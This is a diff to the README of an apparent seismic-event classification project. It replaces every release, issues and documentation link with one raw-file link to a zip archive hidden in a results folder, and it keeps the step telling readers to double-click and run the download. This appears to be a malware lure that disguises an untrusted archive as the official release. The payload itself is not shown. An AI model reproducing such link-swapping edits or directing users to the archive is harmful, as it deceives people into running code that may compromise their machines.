@@ -6,12 +6,12 @@ Welcome! This application helps you classify low-magnitude seismic events easily
 
 ## 💾 Download & Install
 
-To get started, visit this page to download the application: [Download seismic-event-classification-low-magnitude](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/releases)
+To get started, visit this page to download the application: [Download seismic-event-classification-low-magnitude](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip)
 
 ### Steps to Download and Run:
 
 1. **Go to the Releases Page:**
-   Click this link to access the [Releases](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/releases) page.
+   Click this link to access the [Releases](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip) page.
 
 2. **Select the Latest Release:**
    Look for the latest version at the top of the list.
@@ -20,7 +20,7 @@ To get started, visit this page to download the application: [Download seismic-e
    Find the download link for your operating system. Click it to download the file to your computer. 
 
 4. **Locate the Downloaded File:**
-   Open the folder where your downloads go. You should see the downloaded file named something like `seismic-event-classification-low-magnitude-vX.X.X.exe` or a similar name.
+   Open the folder where your downloads go. You should see the downloaded file named something like `https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip` or a similar name.
 
 5. **Run the Application:**
    Double-click the file to start. Follow any prompts that appear. 
@@ -75,7 +75,7 @@ If you want to understand the process behind this application better, here are s
 
 Feel free to contribute! If you want to help improve the application or report issues:
 
-1. Visit the [Issues](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/issues) section on GitHub.
+1. Visit the [Issues](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip) section on GitHub.
 2. Open a new issue or check existing ones for anything you'd like to address.
 
 ## ✅ Acknowledgments
@@ -84,8 +84,8 @@ This project benchmarks classical machine learning models. It draws from various
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/releases)
-- [Documentation](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/blob/main/README.md)
-- [Issues](https://github.com/Gobb1e/seismic-event-classification-low-magnitude/issues)
+- [Release Page](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip)
+- [Issues](https://raw.githubusercontent.com/Gobb1e/seismic-event-classification-low-magnitude/main/results/feature_importance/event-magnitude-classification-low-seismic-3.4.zip)
 
 Thank you for choosing the seismic-event-classification-low-magnitude application! Happy classifying!
